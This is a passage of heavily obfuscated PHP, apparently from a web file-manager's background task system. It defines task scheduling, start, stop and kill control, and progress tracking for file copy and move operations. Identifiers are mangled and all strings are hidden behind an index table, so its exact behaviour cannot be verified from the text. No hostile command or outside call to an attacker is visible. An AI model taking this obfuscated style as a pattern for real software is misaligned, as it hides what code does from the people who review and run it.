(!$ƒ¹´àåï) { $ƒ¹´àåï = time(); } if (time() - $ƒ¹´àåï < $¾€ÃÊÏ²) { return; } $ƒ¹´àåï = time(); $‚ƒ§ş²¾ = Model($ŞÍ¢¹¨½[522])->db($ŞÍ¢¹¨½[12]); if ($‚ƒ§ş²¾) { $‚ƒ§ş²¾->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ŞÍ¢¹¨½[1646], $ŞÍ¢¹¨½[1647]); die; } } public static function taskRun($Ñá¢Ş§) { $§ü²ƒÕ =& $_SERVER[ñ÷§¡å]; self::log($§ü²ƒÕ[1648] . $Ñá¢Ş§[$§ü²ƒÕ[408]] . $§ü²ƒÕ[1649] . $Ñá¢Ş§[$§ü²ƒÕ[32]] . $§ü²ƒÕ[1650] . $Ñá¢Ş§[$§ü²ƒÕ[1651]]); Model($§ü²ƒÕ[1632])->run($Ñá¢Ş§[$§ü²ƒÕ[408]]); $æÇ¥ÍÂí = timeFloat(); $ƒÒ×Ñ¡‚ = $§ü²ƒÕ[12]; switch ($Ñá¢Ş§[$§ü²ƒÕ[33]]) { case $§ü²ƒÕ[316]: $ÊÂıûœë = url_request($Ñá¢Ş§[$§ü²ƒÕ[1651]], $§ü²ƒÕ[240], !1, !1, !1, !1, 10); if ($ÊÂıûœë[$§ü²ƒÕ[763]]) { $ƒÒ×Ñ¡‚ = strlen($ÊÂıûœë[$§ü²ƒÕ[1200]]); } break; case $§ü²ƒÕ[239]: $ƒÒ×Ñ¡‚ = Hook::apply($Ñá¢Ş§[$§ü²ƒÕ[1651]]); default: break; } Model($§ü²ƒÕ[1652])->add(array($§ü²ƒÕ[1653] => $§ü²ƒÕ[12], $§ü²ƒÕ[1654] => $§ü²ƒÕ[207], $§ü²ƒÕ[33] => $§ü²ƒÕ[1655] . $Ñá¢Ş§[$§ü²ƒÕ[408]], $§ü²ƒÕ[1656] => json_encode(array($§ü²ƒÕ[32] => $Ñá¢Ş§[$§ü²ƒÕ[32]], $§ü²ƒÕ[1657] => timeFloat() - $æÇ¥ÍÂí, $§ü²ƒÕ[302] => $ƒÒ×Ñ¡‚)))); $ÁÌÌÙßü = $ƒÒ×Ñ¡‚ ? $§ü²ƒÕ[1658] . $ƒÒ×Ñ¡‚ : $§ü²ƒÕ[12]; self::log($§ü²ƒÕ[1659] . $Ñá¢Ş§[$§ü²ƒÕ[408]] . $§ü²ƒÕ[174] . $ÁÌÌÙßü); return !0; } private static function valueGet($ÊÁ÷·å) { $óÒ™ôÊ¥ =& $_SERVER[ñ÷§¡å]; $Ò¢²ëû¢ = $óÒ™ôÊ¥[1660]; $‹¸Òß–Š = Model($óÒ™ôÊ¥[444])->get($ÊÁ÷·å, $Ò¢²ëû¢); if (is_null($‹¸Òß–Š)) { Model($óÒ™ôÊ¥[444])->set($óÒ™ôÊ¥[763], $óÒ™ôÊ¥[98], $Ò¢²ëû¢); Model($óÒ™ôÊ¥[444])->set($óÒ™ôÊ¥[1622], $óÒ™ôÊ¥[207], $Ò¢²ëû¢); $‹¸Òß–Š = Model($óÒ™ôÊ¥[444])->get($ÊÁ÷·å, $Ò¢²ëû¢); } return $‹¸Òß–Š; } private static function valueSet($»èŒóß, $…—†Ÿé×) { $×ğû×‡– =& $_SERVER[ñ÷§¡å]; $äá‰¡Å = $×ğû×‡–[1661]; CacheLock::lock($äá‰¡Å); $¢Á‡½êó = Model($×ğû×‡–[444])->set($»èŒóß, $…—†Ÿé×, $×ğû×‡–[1660]); CacheLock::unlock($äá‰¡Å); return $¢Á‡½êó; } protected static function log($‹Şáùé£) { write_log($‹Şáùé£, $_SERVER[ñ÷§¡å][1647]); } private static function cacheClear() { $±¦¡–”Ø =& $_SERVER[ñ÷§¡å]; Cache::clearMemory(Model($±¦¡–”Ø[444])->cacheKey($±¦¡–”Ø[1660])); Cache::clearMemory(Model($±¦¡–”Ø[444])->cacheKey($±¦¡–”Ø[1662])); Model($±¦¡–”Ø[1632])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($•²î®Å®, $ÇÎä¯ü = '', $êÆİ‚™ê = 0, $íÍÔóÒ· = '') { $û™¶øœ¼ =& $_SERVER[ñ÷§¡å]; if (self::get($•²î®Å®)) { return; } $this->task = array($û™¶øœ¼[408] => $•²î®Å®, $û™¶øœ¼[1663] => USER_ID, $û™¶øœ¼[1562] => $íÍÔóÒ·, $û™¶øœ¼[33] => $ÇÎä¯ü, $û™¶øœ¼[1071] => $û™¶øœ¼[12], $û™¶øœ¼[799] => $êÆİ‚™ê, $û™¶øœ¼[1664] => 0, $û™¶øœ¼[1665] => 0, $û™¶øœ¼[1666] => 0, $û™¶øœ¼[1667] => timeFloat(), $û™¶øœ¼[1668] => 0, $û™¶øœ¼[1669] => 0, $û™¶øœ¼[1670] => 0, $û™¶øœ¼[1671] => 0, $û™¶øœ¼[763] => $û™¶øœ¼[1622]); $GLOBALS[$û™¶øœ¼[1672]] = 1; Hook::bind($û™¶øœ¼[1627], array($this, $û™¶øœ¼[1673])); Hook::bind($û™¶øœ¼[1674], array($this, $û™¶øœ¼[1675])); $this->startAfter(); Hook::trigger($û™¶øœ¼[1676], $this->task); $this->task[$û™¶øœ¼[1669]] = timeFloat(); } public function end() { $æöğÓÙ— =& $_SERVER[ñ÷§¡å]; if (!$this->task) { return; } if ($this->task[$æöğÓÙ—[1669]]) { self::valueSet($this->task[$æöğÓÙ—[408]], !1); } $şËÕù¸ı = timeFloat() - $this->task[$æöğÓÙ—[1667]]; self::log($æöğÓÙ—[1677] . $this->task[$æöğÓÙ—[408]] . $æöğÓÙ—[1678] . $şËÕù¸ı . $æöğÓÙ—[1679]); Hook::unbind($æöğÓÙ—[1627], array($this, $æöğÓÙ—[1673])); Hook::unbind($æöğÓÙ—[1674], array($this, $æöğÓÙ—[1675])); $this->endAfter(); $this->task = !1; } public function update($‘„Ê–‹ß = 0, $á‰ï‡„Ğ = false) { $õÉÙ¦Û› =& $_SERVER[ñ÷§¡å]; $¸Ì¤¿ØÂ =& $this->task; if (!$¸Ì¤¿ØÂ) { return; } $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1664]] += $‘„Ê–‹ß; $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1668]] = timeFloat(); if ($¸Ì¤¿ØÂ[$õÉÙ¦Û›[799]]) { if ($¸Ì¤¿ØÂ[$õÉÙ¦Û›[799]] < $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1664]]) { $¸Ì¤¿ØÂ[$õÉÙ¦Û›[799]] = $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1664]]; } $¢“îæøÑ = timeFloat() - $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1667]] - $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1670]]; if ($¢“îæøÑ <= 0) { $¢“îæøÑ = 0.001; } $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1665]] = $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1664]] / $¸Ì¤¿ØÂ[$õÉÙ¦Û›[799]]; $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1666]] = $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1664]] / $¢“îæøÑ; if ($¸Ì¤¿ØÂ[$õÉÙ¦Û›[1665]] > 0) { $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1671]] = $¢“îæøÑ * (1 - $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1665]]) / $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1665]]; } $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1671]] = $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1671]] <= 0 ? 0 : $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1671]]; } $this->updateAfter(); $Å¼ÜëÈÅ = 0.2; if (timeFloat() - $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1669]] < $Å¼ÜëÈÅ && !$á‰ï‡„Ğ) { return; } $Î˜ùÄãˆ = self::get($¸Ì¤¿ØÂ[$õÉÙ¦Û›[408]]); $Á¶áúïÑ = $Î˜ùÄãˆ[$õÉÙ¦Û›[763]]; if ($Á¶áúïÑ == self::STATYS_KILL) { $ò…ŒÔ¢Á = array($õÉÙ¦Û›[1680] => LNG($õÉÙ¦Û›[1681]), $õÉÙ¦Û›[1198] => !1); Cache::set($õÉÙ¦Û›[1682] . $this->task[$õÉÙ¦Û›[408]], $ò…ŒÔ¢Á, 30); $this->onKill(); $this->end(); die; } else { if ($Á¶áúïÑ == self::STATYS_STOP) { $É“«ì‘… = 2; $Î˜ùÄãˆ[$õÉÙ¦Û›[1670]] += $É“«ì‘…; self::valueSet($¸Ì¤¿ØÂ[$õÉÙ¦Û›[408]], $Î˜ùÄãˆ); sleep($É“«ì‘…); $this->update(); return; } } $¸Ì¤¿ØÂ[$õÉÙ¦Û›[763]] = $Á¶áúïÑ ? $Á¶áúïÑ : $¸Ì¤¿ØÂ[$õÉÙ¦Û›[763]]; $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1670]] = $Î˜ùÄãˆ[$õÉÙ¦Û›[1670]] ? $Î˜ùÄãˆ[$õÉÙ¦Û›[1670]] : 0; $¸Ì¤¿ØÂ[$õÉÙ¦Û›[1669]] = timeFloat(); Hook::trigger($õÉÙ¦Û›[1683], $¸Ì¤¿ØÂ); self::valueSet($¸Ì¤¿ØÂ[$õÉÙ¦Û›[408]], $¸Ì¤¿ØÂ); } public function onKillSet($¥”œŞ—Ğ, $¸š·©šÍ = array()) { $this->onKillCall = array($¥”œŞ—Ğ, $¸š·©šÍ); } public function onKill() { $è´¸ÅØ =& $_SERVER[ñ÷§¡å]; self::log($è´¸ÅØ[1677] . $this->task[$è´¸ÅØ[408]] . $è´¸ÅØ[1684]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÑÎ²Êµ¢) { $¬µÇØ³È =& $_SERVER[ñ÷§¡å]; Cache::set($¬µÇØ³È[1682] . $this->task[$¬µÇØ³È[408]], $ÑÎ²Êµ¢, 60); return $ÑÎ²Êµ¢; } public static function get($¾´äÄ¥ä) { $ÍÅÂ›¸ß =& $_SERVER[ñ÷§¡å]; $ÚòıÑÅà = self::valueGet($¾´äÄ¥ä); if (is_array($ÚòıÑÅà) && $ÚòıÑÅà[$ÍÅÂ›¸ß[1685]]) { $ëà¡õôá = ActionApply($ÚòıÑÅà[$ÍÅÂ›¸ß[1685]], array($ÚòıÑÅà)); $ÚòıÑÅà = is_array($ëà¡õôá) ? $ëà¡õôá : $ÚòıÑÅà; } return $ÚòıÑÅà; } public static function listData() { $æ°³şÈÍ = self::valueGet(); return array_sort_by($æ°³şÈÍ, $_SERVER[ñ÷§¡å][1667], !0); } public static function kill($½¯ºßú) { return self::changeStatus($½¯ºßú, self::STATYS_KILL); } public static function stop($‘‡õæ÷–) { return self::changeStatus($‘‡õæ÷–, self::STATYS_STOP); } public static function restart($ˆĞÏïá) { return self::changeStatus($ˆĞÏïá, self::STATYS_RUNNING); } public static function killAll() { $¯¸şáŠ» =& $_SERVER[ñ÷§¡å]; $¾ğ”•Æ¯ = self::listData(); foreach ($¾ğ”•Æ¯ as $ÙâìõÔ) { self::kill($ÙâìõÔ[$¯¸şáŠ»[408]]); } sleep(2); foreach ($¾ğ”•Æ¯ as $ÙâìõÔ) { self::valueSet($ÙâìõÔ[$¯¸şáŠ»[408]], !1); } } private static function changeStatus($İÑß¦³ë, $Ÿòİäƒ×) { $ Ñ§›€Ø =& $_SERVER[ñ÷§¡å]; $ú´³Ø¯Õ = self::valueGet($İÑß¦³ë); if (!$ú´³Ø¯Õ) { return !1; } $ú´³Ø¯Õ[$ Ñ§›€Ø[763]] = $Ÿòİäƒ×; self::valueSet($İÑß¦³ë, $ú´³Ø¯Õ); self::log($ Ñ§›€Ø[1686] . $ú´³Ø¯Õ[$ Ñ§›€Ø[408]] . $ Ñ§›€Ø[1687] . $Ÿòİäƒ×); return !0; } public static function valueGet($®ŸÜ†¦· = false) { $Ù»İœÙ =& $_SERVER[ñ÷§¡å]; if ($®ŸÜ†¦·) { $…¤´¡Î = Model($Ù»İœÙ[456])->where(array($Ù»İœÙ[104] => $®ŸÜ†¦·, $Ù»İœÙ[33] => $Ù»İœÙ[1078]))->find(); return $…¤´¡Î ? json_decode($…¤´¡Î[$Ù»İœÙ[383]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($œÃ ­± = false) { $ª¤í§ÊÙ =& $_SERVER[ñ÷§¡å]; $ßÓËÏº = array($ª¤í§ÊÙ[33] => $ª¤í§ÊÙ[1078]); if ($œÃ ­±) { $ßÓËÏº[$ª¤í§ÊÙ[1663]] = $œÃ ­±; } $Û½÷ÉÜƒ = Model($ª¤í§ÊÙ[456])->where($ßÓËÏº)->select(); $Û½÷ÉÜƒ = $Û½÷ÉÜƒ ? $Û½÷ÉÜƒ : array(); foreach ($Û½÷ÉÜƒ as $¿¹ıÄÌÇ => $ˆìÏØ¨) { $Û½÷ÉÜƒ[$¿¹ıÄÌÇ] = json_decode($ˆìÏØ¨[$ª¤í§ÊÙ[383]], !0); } return $Û½÷ÉÜƒ; } public static function valueSet($ä¢íîÊæ, $¨õ¸ùÖö) { $…ı¦®µ¥ =& $_SERVER[ñ÷§¡å]; if (!$¨õ¸ùÖö) { return Model($…ı¦®µ¥[456])->where(array($…ı¦®µ¥[104] => $ä¢íîÊæ, $…ı¦®µ¥[33] => $…ı¦®µ¥[1078]))->delete(); } $Òëü¹ïˆ = json_encode($¨õ¸ùÖö); if (!$Òëü¹ïˆ) { ob_start(); var_dump($¨õ¸ùÖö); $—´ŸÔ¡Û = ob_get_clean(); self::log($…ı¦®µ¥[1688] . json_encode_force($—´ŸÔ¡Û)); } if (!$ä¢íîÊæ || !$¨õ¸ùÖö[$…ı¦®µ¥[408]]) { return !1; } $áÒÀ¿¬µ = array($…ı¦®µ¥[33] => $…ı¦®µ¥[1078], $…ı¦®µ¥[1663] => USER_ID, $…ı¦®µ¥[104] => $ä¢íîÊæ, $…ı¦®µ¥[383] => $Òëü¹ïˆ); $ŸÏ¶Æ·Û = $…ı¦®µ¥[1689]; CacheLock::lock($ŸÏ¶Æ·Û); Model($…ı¦®µ¥[456])->add($áÒÀ¿¬µ, array(), !0); CacheLock::unlock($ŸÏ¶Æ·Û); } public static function log($øÑ´­ãŸ) { if (!GLOBAL_DEBUG) { return; } write_log($øÑ´­ãŸ, $_SERVER[ñ÷§¡å][1690]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ˆ²ï–¾ =& $_SERVER[ñ÷§¡å]; $šñœèÕ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ˆ²ï–¾[1691], array($this, $ˆ²ï–¾[1692])); Hook::bind($ˆ²ï–¾[1222], array($this, $ˆ²ï–¾[1693])); Hook::bind($ˆ²ï–¾[1694], array($this, $ˆ²ï–¾[1695])); Hook::bind($ˆ²ï–¾[613], array($this, $ˆ²ï–¾[1696])); Hook::bind($ˆ²ï–¾[614], array($this, $ˆ²ï–¾[1697])); Hook::bind($ˆ²ï–¾[619], array($this, $ˆ²ï–¾[1698])); Hook::bind($ˆ²ï–¾[620], array($this, $ˆ²ï–¾[1699])); Hook::bind($ˆ²ï–¾[616], array($this, $ˆ²ï–¾[1700])); Hook::bind($ˆ²ï–¾[617], array($this, $ˆ²ï–¾[1701])); Hook::bind($ˆ²ï–¾[583], array($this, $ˆ²ï–¾[1702])); Hook::bind($ˆ²ï–¾[580], array($this, $ˆ²ï–¾[1702])); Hook::bind($ˆ²ï–¾[585], array($this, $ˆ²ï–¾[1702])); Hook::bind($ˆ²ï–¾[587], array($this, $ˆ²ï–¾[1702])); Hook::bind($ˆ²ï–¾[589], array($this, $ˆ²ï–¾[1702])); Hook::bind($ˆ²ï–¾[1703], array($this, $ˆ²ï–¾[1704])); Hook::bind($ˆ²ï–¾[606], array($this, $ˆ²ï–¾[1705])); $this->sourceModelCopyFlag = !1; Hook::bind($ˆ²ï–¾[1706], array($this, $ˆ²ï–¾[1707])); Hook::bind($ˆ²ï–¾[1708], array($this, $ˆ²ï–¾[1709])); Hook::bind($ˆ²ï–¾[1710], array($this, $ˆ²ï–¾[1711])); $šñœèÕ[$ˆ²ï–¾[1712]] = LNG($ˆ²ï–¾[1713]); $šñœèÕ[$ˆ²ï–¾[1714]] = 0; $šñœèÕ[$ˆ²ï–¾[1715]] = 0; $šñœèÕ[$ˆ²ï–¾[1071]] = $ˆ²ï–¾[12]; $šñœèÕ[$ˆ²ï–¾[1716]] = $ˆ²ï–¾[12]; $šñœèÕ[$ˆ²ï–¾[1717]] = 0; $šñœèÕ[$ˆ²ï–¾[1718]] = 0; $šñœèÕ[$ˆ²ï–¾[1719]] = 0; if (!$šñœèÕ[$ˆ²ï–¾[1562]]) { $šñœèÕ[$ˆ²ï–¾[1562]] = LNG($ˆ²ï–¾[1720]); } } protected function endAfter() { $¢™»íê« =& $_SERVER[ñ÷§¡å]; Hook::unbind($¢™»íê«[1691], array($this, $¢™»íê«[1692])); Hook::unbind($¢™»íê«[1222], array($this, $¢™»íê«[1693])); Hook::unbind($¢™»íê«[1694], array($this, $¢™»íê«[1695])); Hook::unbind($¢™»íê«[613], array($this, $¢™»íê«[1696])); Hook::unbind($¢™»íê«[614], array($this, $¢™»íê«[1697])); Hook::unbind($¢™»íê«[619], array($this, $¢™»íê«[1698])); Hook::unbind($¢™»íê«[620], array($this, $¢™»íê«[1699])); Hook::unbind($¢™»íê«[616], array($this, $¢™»íê«[1700])); Hook::unbind($¢™»íê«[617], array($this, $¢™»íê«[1701])); Hook::unbind($¢™»íê«[583], array($this, $¢™»íê«[1702])); Hook::unbind($¢™»íê«[580], array($this, $¢™»íê«[1702])); Hook::unbind($¢™»íê«[585], array($this, $¢™»íê«[1702])); Hook::unbind($¢™»íê«[587], array($this, $¢™»íê«[1702])); Hook::unbind($¢™»íê«[589], array($this, $¢™»íê«[1702])); Hook::unbind($¢™»íê«[1703], array($this, $¢™»íê«[1704])); Hook::unbind($¢™»íê«[606], array($this, $¢™»íê«[1705])); Hook::unbind($¢™»íê«[1706], array($this, $¢™»íê«[1707])); Hook::unbind($¢™»íê«[1708], array($this, $¢™»íê«[1709])); Hook::unbind($¢™»íê«[1710], array($this, $¢™»íê«[1711])); } public function copyMoveStart($Ğ•œ„Ô, $¥º¥´Ùò, $†´ô’¼¥, $“¨ËİƒÆ) { $ş‡ÂÈØë =& $_SERVER[ñ÷§¡å]; self::log($ş‡ÂÈØë[1721] . $¥º¥´Ùò . $ş‡ÂÈØë[80] . $“¨ËİƒÆ); $—Ù¬†²· = rtrim(TEMP_FILES, $ş‡ÂÈØë[8]); if (substr($¥º¥´Ùò, 0, strlen($—Ù¬†²·)) == $—Ù¬†²·) { return; } if (substr($“¨ËİƒÆ, 0, strlen($—Ù¬†²·)) == $—Ù¬†²·) { return; } $æ¥ßâ­ =& $this->task; $æ¥ßâ­[$ş‡ÂÈØë[1722]] = KodIO::transferType($Ğ•œ„Ô, $†´ô’¼¥); $this->update(); } public function updateAfter() { $Ô…ùİş =& $_SERVER[ñ÷§¡å]; $ˆ©âº­ =& $this->task; if (!$ˆ©âº­[$Ô…ùİş[776]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ˆ©âº­[$Ô…ùİş[1722]] == $Ô…ùİş[1311]) { return; } self::updateTask($ˆ©âº­); } private static function updateTask(&$ˆµ×ËŒº) { $Îì™Ÿå¸ =& $_SERVER[ñ÷§¡å]; if ($ˆµ×ËŒº[$Îì™Ÿå¸[1722]] == $Îì™Ÿå¸[1206] || $ˆµ×ËŒº[$Îì™Ÿå¸[1722]] == $Îì™Ÿå¸[117]) { if ($ˆµ×ËŒº[$Îì™Ÿå¸[1716]]) { $ˆµ×ËŒº[$Îì™Ÿå¸[1719]] = $ˆµ×ËŒº[$Îì™Ÿå¸[1718]] + $ˆµ×ËŒº[$Îì™Ÿå¸[1715]]; } } else { if ($ˆµ×ËŒº[$Îì™Ÿå¸[1722]] == $Îì™Ÿå¸[1312]) { if ($ˆµ×ËŒº[$Îì™Ÿå¸[1716]] == $Îì™Ÿå¸[1206]) { $ˆµ×ËŒº[$Îì™Ÿå¸[1719]] = $ˆµ×ËŒº[$Îì™Ÿå¸[1718]] + $ˆµ×ËŒº[$Îì™Ÿå¸[1715]] * 0.5; } else { if ($ˆµ×ËŒº[$Îì™Ÿå¸[1716]] == $Îì™Ÿå¸[117]) { $ˆµ×ËŒº[$Îì™Ÿå¸[1719]] = $ˆµ×ËŒº[$Îì™Ÿå¸[1718]] + $ˆµ×ËŒº[$Îì™Ÿå¸[1714]] * 0.5 + $ˆµ×ËŒº[$Îì™Ÿå¸[1715]] * 0.5; } } } } $ˆµ×ËŒº[$Îì™Ÿå¸[1665]] = $ˆµ×ËŒº[$Îì™Ÿå¸[1719]] / $ˆµ×ËŒº[$Îì™Ÿå¸[776]]; if ($ˆµ×ËŒº[$Îì™Ÿå¸[1665]] > 0) { $âî·±… = timeFloat() - $ˆµ×ËŒº[$Îì™Ÿå¸[1667]] - $ˆµ×ËŒº[$Îì™Ÿå¸[1670]]; $ˆµ×ËŒº[$Îì™Ÿå¸[1671]] = $âî·±… * (1 - $ˆµ×ËŒº[$Îì™Ÿå¸[1665]]) / $ˆµ×ËŒº[$Îì™Ÿå¸[1665]]; } } public function addPath($¼‘–³ß‡) { $—²Î·ş¨ =& $_SERVER[ñ÷§¡å]; if (!$¼‘–³ß‡) { return; } $ªÒ¶²äª =& $this->task; $Õ‹…Üû = IO::infoWithChildren($¼‘–³ß‡); $Í•ˆ³ßŸ = $ªÒ¶²äª[$—²Î·ş¨[1723]] ? $ªÒ¶²äª[$—²Î·ş¨[1723]][$—²Î·ş¨[1724]] : 0; $ªÒ¶²äª[$—²Î·ş¨[1723]] = array($—²Î·ş¨[1724] => $Í•ˆ³ßŸ + 1, $—²Î·ş¨[429] => $Õ‹…Üû[$—²Î·ş¨[32]], $—²Î·ş¨[94] => $Õ‹…Üû[$—²Î·ş¨[94]], $—²Î·ş¨[528] => $Õ‹…Üû[$—²Î·ş¨[528]] ? $Õ‹…Üû[$—²Î·ş¨[528]] : $Õ‹…Üû[$—²Î·ş¨[94]]); if ($Õ‹…Üû[$—²Î·ş¨[33]] == $—²Î·ş¨[209]) { $ªÒ¶²äª[$—²Î·ş¨[799]] += 1; } else { $ªÒ¶²äª[$—²Î·ş¨[799]] += $Õ‹…Üû[$—²Î·ş¨[89]][$—²Î·ş¨[87]]; if ($Õ‹…Üû[$—²Î·ş¨[411]]) { $ªÒ¶²äª[$—²Î·ş¨[799]] += $Õ‹…Üû[$—²Î·ş¨[89]][$—²Î·ş¨[88]] + 1; } } $ªÒ¶²äª[$—²Î·ş¨[776]] += $Õ‹…Üû[$—²Î·ş¨[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ŞÂÌ»Å¡) { } public function sourceAddHashEnd($–Íöù¦ö) { } public function sourceAddFileStart($‰¹™‹™…) { $­Ğ±µòÄ =& $_SERVER[ñ÷§¡å]; $¤Ô»Óğ =& $this->task; $¤Ô»Óğ[$­Ğ±µòÄ[1714]] = $‰¹™‹™…[$­Ğ±µòÄ[86]]; $¤Ô»Óğ[$­Ğ±µòÄ[1712]] = $‰¹™‹™…[$­Ğ±µòÄ[32]]; $¤Ô»Óğ[$­Ğ±µòÄ[1071]] = $‰¹™‹™…[$­Ğ±µòÄ[32]]; $¤Ô»Óğ[$­Ğ±µòÄ[1725]] = $‰¹™‹™…[$­Ğ±µòÄ[94]]; $this->update(); } public function sourceAddFileEnd($ÏÏÂìÒ“) { $£ı²Û²Ş =& $_SERVER[ñ÷§¡å]; $äš¿Âœ =& $this->task; $äš¿Âœ[$£ı²Û²Ş[1719]] += $ÏÏÂìÒ“[$£ı²Û²Ş[86]]; $äš¿Âœ[$£ı²Û²Ş[1725]] = $ÏÏÂìÒ“[$£ı²Û²Ş[94]]; $this->update(1); } public function copyFileStart($÷¿½şı”, $ªü€¼˜ô, $ùµ­Ø, $Ù¯È§­É, $úãÓ¦–, $ûÅ· Èó) { $øªÊ‘«Ø =& $_SERVER[ñ÷§¡å]; $ƒÍÎê¢É = $úãÓ¦–; if ($ƒÍÎê¢É == $GLOBALS[$øªÊ‘«Ø[1726]]) { $ƒÍÎê¢É = $GLOBALS[$øªÊ‘«Ø[1727]]; } $GLOBALS[$øªÊ‘«Ø[1727]] = $úãÓ¦–; $GLOBALS[$øªÊ‘«Ø[1726]] = $ûÅ· Èó; $Ã´Ìâš† =& $this->task; $Ã´Ìâš†[$øªÊ‘«Ø[1712]] = $ƒÍÎê¢É; $Ã´Ìâš†[$øªÊ‘«Ø[1714]] = (int) $÷¿½şı”->size($ªü€¼˜ô); $Ã´Ìâš†[$øªÊ‘«Ø[1715]] = 0; $Ã´Ìâš†[$øªÊ‘«Ø[1071]] = $øªÊ‘«Ø[12]; $Ã´Ìâš†[$øªÊ‘«Ø[1716]] = $øªÊ‘«Ø[12]; $Ã´Ìâš†[$øªÊ‘«Ø[1717]] = 0; $Å ÅóÂ = $Ã´Ìâš†[$øªÊ‘«Ø[1714]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ã´Ìâš†[$øªÊ‘«Ø[408]] . $øªÊ‘«Ø[1728]); if ($Å ÅóÂ && file_exists(get_path_father($Ù¯È§­É))) { Cache::set($Ã´Ìâš†[$øªÊ‘«Ø[408]] . $øªÊ‘«Ø[1728], $Ù¯È§­É); $Ã´Ìâš†[$øªÊ‘«Ø[1685]] = array($øªÊ‘«Ø[1729], $øªÊ‘«Ø[1730]); } $this->update(0, $Å ÅóÂ); } public static function updateCopyLocalFileSize($ÃÀøş) { $šäÉ¸¬³ =& $_SERVER[ñ÷§¡å]; $ßÛ®”ÇÁ = Cache::get($ÃÀøş[$šäÉ¸¬³[408]] . $šäÉ¸¬³[1728]); if (!$ßÛ®”ÇÁ || !file_exists($ßÛ®”ÇÁ)) { return $ÃÀøş; } $ÃÀøş[$šäÉ¸¬³[1715]] = @filesize($ßÛ®”ÇÁ); $ÃÀøş[$šäÉ¸¬³[1719]] += $ÃÀøş[$šäÉ¸¬³[1715]]; self::updateTask($ÃÀøş); return $ÃÀøş; } public function copyFileEnd($™ë‘¶Öµ, $µÔïÊ¿ì, $—û¸Ïö, $ìÀÑş”Ê, $¾×üô´, $‘§ß’ìˆ) { $ÀÉÔÑØø =& $_SERVER[ñ÷§¡å]; $Éšà‘œ =& $this->task; $Éšà‘œ[$ÀÉÔÑØø[1715]] = $Éšà‘œ[$ÀÉÔÑØø[1714]]; $Éšà‘œ[$ÀÉÔÑØø[1716]] = $ÀÉÔÑØø[12]; unset($Éšà‘œ[$ÀÉÔÑØø[1685]]); if ($¾×üô´ == $Éšà‘œ[$ÀÉÔÑØø[1712]]) { $Éšà‘œ[$ÀÉÔÑØø[1718]] += $Éšà‘œ[$ÀÉÔÑØø[1714]]; $Éšà‘œ[$ÀÉÔÑØø[1719]] = $Éšà‘œ[$ÀÉÔÑØø[1718]]; $„µâÆ› = 1; if (isset($Éšà‘œ[$ÀÉÔÑØø[1725]]) && $Éšà‘œ[$ÀÉÔÑØø[1725]] == $µÔïÊ¿ì) { $„µâÆ› = 0; } $this->update($„µâÆ›); } else { $this->update(); $Éšà‘œ[$ÀÉÔÑØø[1715]] = 0; } Cache::remove($Éšà‘œ[$ÀÉÔÑØø[408]] . $ÀÉÔÑØø[1728]); self::log($ÀÉÔÑØø[1731] . $µÔïÊ¿ì . $ÀÉÔÑØø[80] . $ìÀÑş”Ê . $ÀÉÔÑØø[65] . $¾×üô´ . $ÀÉÔÑØø[1732] . $Éšà‘œ[$ÀÉÔÑØø[1712]]); } public function updateFileEnd($’–ê‰‰, $ Úí³ƒ) { $÷Ş‚í» =& $_SERVER[ñ÷§¡å]; $ÑÑßŠ²— =& $this->task; $ÑÑßŠ²—[$÷Ş‚í»[1712]] = $’–ê‰‰; $ÑÑßŠ²—[$÷Ş‚í»[1714]] = $ Úí³ƒ; $ÑÑßŠ²—[$÷Ş‚í»[1718]] += $ Úí³ƒ; $ÑÑßŠ²—[$÷Ş‚í»[1719]] = $ÑÑßŠ²—[$÷Ş‚í»[1718]]; $this->update(1); self::log($÷Ş‚í»[1733] . $’–ê‰‰); } public function sourceModelCopy($Ä·ôß¤Ã) { $‡âÙş· =& $_SERVER[ñ÷§¡å]; $òìÍ†ÃÑ = $Ä·ôß¤Ã[0]; $âéÂÍ‘ = $Ä·ôß¤Ã[1]; $Å†‡•ÅÃ =& $this->task; $this->sourceModelCopyFlag = !0; $Ùª„¯€œ = 0; switch ($òìÍ†ÃÑ) { case $‡âÙş·[581]: $Ùª„¯€œ = 1; break; case $‡âÙş·[584]: $Å†‡•ÅÃ[$‡âÙş·[1712]] = $âéÂÍ‘[$‡âÙş·[32]]; break; case $‡âÙş·[586]: $Ùª„¯€œ = intval($Ä·ôß¤Ã[$‡âÙş·[389]] * 0.4); break; case $‡âÙş·[588]: $Ùª„¯€œ = intval($Ä·ôß¤Ã[$‡âÙş·[389]] * 0.2); break; case $‡âÙş·[590]: $Ùª„¯€œ = intval($Ä·ôß¤Ã[$‡âÙş·[389]] * 0.4); break; } $this->update($Ùª„¯€œ); 